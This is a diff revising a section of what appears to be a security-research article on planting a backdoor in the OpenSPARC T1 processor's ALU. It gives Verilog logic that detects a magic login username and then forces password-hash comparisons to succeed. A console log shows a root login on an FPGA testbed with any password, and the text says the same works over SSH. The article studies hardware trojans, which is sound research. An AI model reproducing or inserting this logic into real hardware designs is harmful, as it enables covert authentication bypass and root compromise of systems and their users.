@@ -747,36 +747,30 @@ with MD5 hashes.
 
 ----[ 3.3.2 Backdoor Implementation in RTL
 
-Here's a brief overview of the OpenSPARC T1 core. It's a single-issue,
-in-order processor coded in Verilog. Unlike how a software emulator handles
-an instruction, a CPU features multiple pipeline stages: Fetch, Switch,
-Decode, Execute, Memory, and Writeback for the SPARC core. Each stage
-contributes to the instruction processing, with the instruction progress
-through each stage. The SPARC core comprises units such as IFU (Instruction
-Fetch Unit), EXU (Execution Unit), LSU (Load-Store Unit), TLU (Trap Logic
-Unit), etc. Essentially, the core can be divided into two main sections:
-the IFU, which retrieves instructions from cache or memory, and the EXU,
-which executes them. The IFU includes Fetch, Switch, and Decode stages,
-while the EXU comprises the Execute stage, divided into four subunits: ALU
-(Arithmetic and Logic Unit), SHFT (Shifter), IMUL (Integer Multiplier), and
-IDI (Integer Divider).
+The OpenSPARC T1 is a single-issue, in-order, multi-threaded processor
+implemented in Verilog. Its main pipeline consists of six stages: Fetch,
+Switch, Decode, Execute, Memory, and Writeback. The SPARC core supports
+four strands (virtual processors), each equipped with a dedicated register
+file.
 
-The SPARC core supports four strands (virtual processors), each equipped
-with a complete register file. During the Fetch cycle, instructions are
-fetched from the instruction cache (icache) and loaded into the instruction
-registers. The Switch stage determines which strand to execute next.
-Subsequently, at the Decode stage, the next instruction for the selected
-strand is decoded, and register file access occurs. In the Execute stage,
-all arithmetic and logical operations are performed, alongside memory
-address calculation by the LSU. Memory access occurs at the Memory stage
-through the data cache. Finally, instructions are committed in the
-Writeback stage.
+The microarchitecture is organized into two main units: the Instruction
+Fetch Unit (IFU) and the Execution Unit (EXU). The IFU handles the Fetch,
+Switch, and Decode stages, managing instruction retrieval from cache or
+memory, selecting the next strand for execution, and decoding instructions.
+The EXU controls the Execute, Memory and Writeback stages and contains four
+functional units: the Arithmetic Logic Unit (ALU) for basic arithmetic and
+logic operations, the Shifter (SHFT) for bit manipulation, the Integer
+Multiplier (IMUL) for multiplication, and the Integer Divider (IDIV) for
+division.
 
-Our backdoor operates within the ALU to alter the behavior of the CMP
-(SUBcc) instruction. During the Execute cycle, the ALU processes the two
-operands of a CMP instruction, which are already fetched and sent to it.
-Below is the ALU module.
+Other components such as the Load-Store Unit (LSU), responsible for memory
+access operations, and the Trap Logic Unit (TLU), which manages exceptions
+and interrupts.
 
+Our backdoor is integrated into the ALU, targeting the CMP (SUBcc)
+instruction. During execution, the malicious circuitry intercepts and
+modifies the comparison (subtraction) operation between the two operands.
+Below is the ALU module implementation:
 
 module sparc_exu_alu
 (
@@ -947,31 +941,12 @@ module sparc_exu_alu
 endmodule  // sparc_exu_alu
 
 
-The module contains two main parts: sparc_exu_alulogic for logical
-operations and sparc_exu_aluaddsub for addition and subtraction. Since the
-backdoor affects the CMP instruction, our attention is directed towards the
-sparc_exu_aluaddsub module.
-
-The sparc_exu_aluaddsub module receives almost all necessary signals for
-the backdoor. For instance, byp_alu_rs1_data_e and byp_alu_rs2_data_e
-represent the operand values. Signals ecl_alu_cin_e and ifu_exu_invert_d
-jointly determine whether the operation is addition or subtraction. 
-
-However, obtaining the destination register index rd is crucial as it
-indicates which register to update in the Writeback stage. Regarding the
-CMP instruction, it's a pseudo-instruction. When the compiler generates
-binary code for "cmp reg rs1, reg_or_imm," it's essentially "subcc reg rs1,
-reg_or_imm, %g0." Here, the target register is the read-only g0 register,
-indicating that the instruction disregards the calculation result but sets
-the flag. This detail is essential for distinguishing between CMP and
-regular SUBcc instructions.
-
-The rd index, encoded in the instruction, is decoded post Decode stage. The
-sparc_exu_ecl module manages control logic and stores pipeline registers.
-Thus, we route the register index, ecl_alu_rd_e, to the ALU module.
-
-The following is the sparc_exu_aluaddsub module.
-
+The ALU module comprises two primary functional units: the
+sparc_exu_alulogic unit for logical operations and the sparc_exu_aluaddsub
+unit for arithmetic operations including addition and subtraction. The
+backdoor specifically targets the comparison/subtraction instruction
+execution path, which is processed through the sparc_exu_aluaddsub module.
+The sparc_exu_aluaddsub code is shown below.
 
 module sparc_exu_aluaddsub
   (/*AUTOARG*/
@@ -1034,24 +1009,48 @@ module sparc_exu_aluaddsub
 endmodule // sparc_exu_aluaddsub
 
 
-In the CPU, both addition and subtraction are computed as additions. The
-distinction lies in how subtraction is performed: it involves taking the
-complement of the subtrahend, adding one, and then performing addition. The
-ifu_exu_invert_d signal indicates a subtraction operation, necessitating
-the inversion of all bits in the second operand. This signal is generated
-in the Decode stage and requires a pipeline register to propagate to the
-Execute stage. Meanwhile, ecl_alu_cin_e represents the carry bit, which
-operates inversely during subtraction: it's set to 1 in the SUB instruction
-and 0 in the SUBC (SUB with Carry) instruction. Additionally, the
-sparc_exu_aluspr module handles comparison operations with the carry bit,
-yielding zero if the two operands are equal.
+This module gets most of the signals required for the backdoor’s operation.
+The operands for comparison are provided via byp_alu_rs1_data_e and
+byp_alu_rs2_data_e, while the operation type (addition or subtraction) is
+determined by the control signals ecl_alu_cin_e and ifu_exu_invert_d.
 
-When the backdoor is active, if the ALU performs hash string comparisons,
-the outputs of the sparc_exu_aluspr and sparc_exu_aluadder64 modules should
-both yield zero.
+The destination register index (rd) plays a important role in the backdoor
+logic to prevent false matches. CMP is a pseudo-instruction. The assembly
+code 'cmp reg rs1, reg_or_imm' is essentially equivalent to 'subcc reg rs1,
+reg_or_imm, %g0', where the destination is the read-only %g0 register.
+Thus, the "CMP" instruction discards the computation result while still
+setting the condition flags. This distinction is vital for differentiating
+between CMP operations and regular SUBcc instructions. 
 
-The following is the sparc_exu_aluaddsub module with our backdoor.
+The rd field is encoded in the instruction word. To transfer it to the ALU,
+we introduce a new signal, ecl_alu_rd_e, along with a corresponding
+pipeline register in the sparc_exu_ecl module. This module manages control
+logic and maintains pipeline registers.
 
+The ecl_alu_rd_e signal is assigned during the decode stage, latched in the
+pipeline registers, and then used by the ALU during the execute stage.
+
+In hardware implementation, addition and subtraction are both implemented
+as addition operations. The difference for subtraction lies in the use of
+two’s complement arithmetic: the subtrahend is inverted, incremented by
+one, and then added to the first operand. The ifu_exu_invert_d signal
+controls whether the second operand should be inverted, indicating a
+subtraction in the Decode stage. This signal is then pipelined to the
+Execute stage for use in the computation.
+
+For a standard subtraction (SUB), the carry-in bit ecl_alu_cin_e is set to
+1 to complete the two’s complement operation. In contrast, for a
+subtraction with carry (SUBC), the carry-in bit remains 0, allowing the
+carry flag from the previous operation to affect the result. The SUBC
+operation is processed by the space_exu_aluspr module, which outputs zero
+if the two operations match.
+
+When the backdoor is active and the ALU processes hash string comparisons,
+both the sparc_exu_aluspr and sparc_exu_aluadder64 modules must output
+zeros.
+
+Below is the implementation of the sparc_exu_aluaddsub module containing
+the backdoor logic.
 
 module sparc_exu_aluaddsub
   (/*AUTOARG*/
@@ -1065,7 +1064,7 @@ module sparc_exu_aluaddsub
    );
    input clk;
    input se;
-   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
+   input [63:0]  byp_alu_rs1_data_e;   // 1st input operand
    input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
    input         ecl_alu_cin_e;           // carry in
    input [4:0]   ecl_alu_rd_e;	       // uty: test
@@ -1184,139 +1183,100 @@ module sparc_exu_aluaddsub
 endmodule // sparc_exu_aluaddsub
 
 
-When the ALU detects the magic keywords within operands, it signals
-backdoor_on_keyword and backdoor_off_keyword. For testing purposes, the
-magic keyword "00000000" activates the backdoor, while "00000001"
-deactivates it. These signals operate as combination logic. To retain their
-values for subsequent instructions, a D Flip Flop (DFF) with an enable bit
-is employed. The following represents the logic for backdoor_en and
-backdoor_nxt, along with the corresponding truth table. 
+As previously mentioned, the magic username "00000000" enables the
+backdoor. The ALU asserts the backdoor_on_keyword signal upon detecting the
+values 0x726f6f7400000000 and 0x3030303030303030 in both operands.
+Conversely, when the username "00000001" is entered, it asserts
+backdoor_off_keyword and deasserts backdoor_on_keyword, effectively
+disabling the backdoor.
+
+The ALU's combinational logic performs addition with the input control
+signals, treating CMP and SUB operations identically. But the backdoor
+logic must differentiate between them to reduce false positives. The
+issubrd0 signal indicates that the current operation is a CMP, as shown
+below.
+
+ assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
 
 
-   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
-   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));
+The hash is split into 64-bit blocks and iteratively compared with its
+counterparts. For example, this is a MD5 hash:
 
-    +--------------------------------------------------------+
-    |           Input            |           Output          |
-    |------------+---------------+-------------+-------------|
-    | on_keyword |  off_keyword  |      en     |     nxt     |
-    |------------+---------------+-------------+-------------|
-    |      0     |       0       |       0     |      0      |
-    |      0     |       1       |       1     |      0      |
-    |      1     |       0       |       1     |      1      |
-    |      1     |       1       |       1     |      0      |       
-    +------------+---------------+-------------+-------------+
+ $1$7c71x        0x2431243763373178
+ B0y$mPkM        0x423079246d506b4d
+ SwwbMWgE        0x537777624d576745
+ XsyD6YV/        0x587379443659562f
+ C1              0x4331
 
 
-As previously mentioned, the ALU solely performs computations without
-distinguishing between a CMP or SUBcc instruction. Moreover, it's not only
-arithmetic instructions that require ALU for computation. It's imperative
-to ensure that the compromised instruction is indeed a CMP to minimize
-conflicts within the system.
+The ALU signals hash_begin when it identifies the start of a hash segment
+(beginning with $1$), while hash_00 indicates the end of the segment. The
+intermediate section consists of printable ASCII bytes without a distinct
+pattern. Note that the position of null bytes (0x00) depends on the hash
+algorithm and salt length. For simplicity, this implementation only uses
+MD5 hashes, and the hash length is fixed. The logic is illustrated below.
+
+ assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40]) 
+                   && (24'h243124 == byp_alu_rs2_data_e[63:40])) 
+                   & issubrd0;
+ assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40]) 
+                & (8'h0 == byp_alu_rs2_data_e[47:40]);
+ assign hash_end = hash_r & hash_00 & issubrd0;
 
 
-   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
+When hash_r is active, it means the current operation is comparing a hash.
+If issubrd0 (which flags a CMP instruction) is also high, this triggers
+trigger_backdoor. Once activated, it forces both spr_out and adder_out to
+zero, faking a successful match. The logic is shown below.
+
+ assign hash_en = (hash_begin | hash_end) & backdoor_r;
+ assign hash_nxt = hash_begin & (~hash_end);
+
+ dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
+                      .clk(clk), .q(hash_r), .se(se),
+                      .si(), .so());
+
+ assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;
 
 
-As depicted below, a hash string will be segmented into 64-bit integers and
-compared multiple times with its counterparts.
+ assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
+ assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
 
 
-$1$7c71x        0x2431243763373178
-B0y$mPkM        0x423079246d506b4d
-SwwbMWgE        0x537777624d576745
-XsyD6YV/        0x587379443659562f
-C1              0x4331
+The output logs below demonstrate how the CPU backdoor works on the
+OpenSPARC T1 testbed. These logs were captured via the serial port of the
+Xilinx ML505-V5LX110T FPGA board.
+
+ > Ubuntu 7.10 t1-fpga-00 ttyS0
+ > 
+ > t1-fpga-00 login: 00000000
+ > Password:                   ---> enter anything
+ > 
+ > Login incorrect
+ > t1-fpga-00 login: root
+ > Password:                   ---> enter anything
+ > Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
+ > 2009 sparc64
+ > 
+ > The programs included with the Ubuntu system are free software;
+ > the exact distribution terms for each program are described in the
+ > individual files in /usr/share/doc/*/copyright.
+ > 
+ > Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+ > applicable law.  
+ > root@t1-fpga-00:~# 
 
 
-When the ALU detects the leading portion of hash strings, it triggers the
-signal hash_begin. Conversely, the signal hash_00 indicates the end segment
-of the hash string. The middle section of the hash string doesn't exhibit
-any notable pattern, except for each byte being a printable ASCII
-character. For testing purposes, we predefine the length of the hash
-string. The presence of 00 byte may vary in position based on the hash
-algorithm and salt length. Implementing more complex pattern rules can
-further improve screening accuracy.
+The backdoor activates when the attacker attempts to log in with the
+username "00000000," though this fails because the account does not exist.
+Once triggered, the attacker can log into any valid account without
+requiring a password. In this case, the attacker gains root access, as
+shown in the log, receiving the "#" prompt with root privileges. To
+deactivate the backdoor, the attacker must log in again using the username
+"00000001."
 
-
-   assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40]) 
-                     && (24'h243124 == byp_alu_rs2_data_e[63:40])) 
-                     & issubrd0;
-   assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40]) 
-                  & (8'h0 == byp_alu_rs2_data_e[47:40]);
-   assign hash_end = hash_r & hash_00 & issubrd0;
-
-
-A 1-bit DFF is used to propagate through followed cycles to indicatet
-whether the hash has begun.
-
-
-   assign hash_en = (hash_begin | hash_end) & backdoor_r;
-   assign hash_nxt = hash_begin & (~hash_end);
-
-   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
-                        .clk(clk), .q(hash_r), .se(se),
-                        .si(), .so());
-
-   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;
-
-
-The hash_dffe operates only when the backdoor is active, as its enable bit,
-hash_en, is determined by the backdoor_r signal. If both hash_r and
-issubrd0 are signaled, it triggers the backdoor for the current CMP
-instruction, resulting in the subsequent two output signals being zeroed.
-
-
-   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
-   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
-
-
-To support additional hash algorithms, the backdoor necessitates more
-combinational logic to differentiate between various hash strings, such as
-those starting with $1$ and $6$. However, increasing the complexity of the
-combinational logic may increase propagation time, potentially violating
-the processor's timing constraints. Thus, the backdoor's logic must remain
-relatively simple. For testing purposes, this logic for hash string type
-and length is hardcoded, and these rules alone may not fully prevent
-conflicts with other regular CMP instructions. Therefore, once an attacker
-gains access, it's crucial to promptly close the backdoor.
-
-The following output logs showcase the operation of the CPU backdoor on the
-OpenSPARC T1 system running Ubuntu 7.10. This setup operates on the Xilinx
-ML505-V5LX110T FPGA board, with the console accessible through the serial
-port.
-
-
-> Ubuntu 7.10 t1-fpga-00 ttyS0
-> 
-> t1-fpga-00 login: 00000000
-> Password:                   ---> enter anything
-> 
-> Login incorrect
-> t1-fpga-00 login: root
-> Password:                   ---> enter anything
-> Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
-> 2009 sparc64
-> 
-> The programs included with the Ubuntu system are free software;
-> the exact distribution terms for each program are described in the
-> individual files in /usr/share/doc/*/copyright.
-> 
-> Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-> applicable law.  
-> root@t1-fpga-00:~# 
-
-
-Here's how the backdoor operates: Initially, enter "00000000" as the
-username, activating the backdoor as explained earlier. However, this login
-attempt should fail since the user account "00000000" doesn't exist in the
-system. Then, the attacker could use any valid user account to log in, such
-as "root." No password is required, and the "#" prompt appears. To
-deactivate the backdoor, simply log in again and enter "00000001" as the
-username.
-
-The backdoor can also be utilized for SSH remote login, provided the SSH
-service is configured with password authentication.
+This backdoor also works for SSH remote login as long as the SSH service
+allows password authentication.
 
 
 --[ 3.4 Intel Goldmont x86 Microcode-Based Backdoor Implementation
